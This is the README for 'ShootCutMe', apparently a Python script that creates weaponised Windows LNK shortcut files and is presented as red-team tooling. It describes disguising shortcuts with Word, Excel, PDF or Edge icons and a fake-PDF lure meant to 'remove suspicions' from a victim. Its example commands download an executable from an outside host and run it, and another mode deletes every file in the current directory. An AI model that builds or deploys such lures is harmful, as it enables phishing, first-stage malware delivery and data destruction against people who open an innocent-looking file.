# ShootCutMe:

LNK files are used on the most modern and advanced APT attacks.

LNK files are windows shortcut files. Using a shortcut file you can launch your own commands.

I am happy to introduce ShootCutMe a script to create LNK files.

Options Available For Version 0.1:

- Fake pdf (Will open a fake Google doc on the browser in kiosk mode to lure the victim and remove suspicions)

- You can choose between different icons (word, Adobe, Excel, PowerPoint, Edge...)

- You can choose what you want to accomplish with the LNK file: download an executable, download and load an executable, execute an executable)
  Using the LNK file you can drop your first-stage malware and complete your red teaming engagement successfully.

## Demo:
<a href="https://www.instagram.com/reel/ClUDIlLofFa/?utm_source=ig_web_copy_link" target="_blank">Demo Video</a>
## Install:

```cmd
python -m venv lnkenv
lnkenv\Scripts\activate.bat
python -m pip install -r requirements.txt
```

## Examples:

### Download File:

```cmd
python shootcutme.py --icon excel --name test1 -d http://10.0.3.90:8081/file.txt fileNameAfterDownload.txt D:\LNKtest
```

### Launch Executable:

```cmd
python shootcutme.py --icon word --name test2 -ex exeToLaunch.exe
```

### Fake PDF

```cmd
python shootcutme.py --icon edge --name <shotcutFileName> -fp <googleDocUrl> <executableToLaunch>
```

### Download And Execute:

```cmd
python shootcutme.py --icon pdf --name <shortCutFileName> -dl http://10.0.3.90:8081/example.exe exampleTest.exe D:\LNKtest
```

### Delete all files on the current directory:

```cmd
python shootCutMe.py -n test1.pdf --icon pdf --delete
```
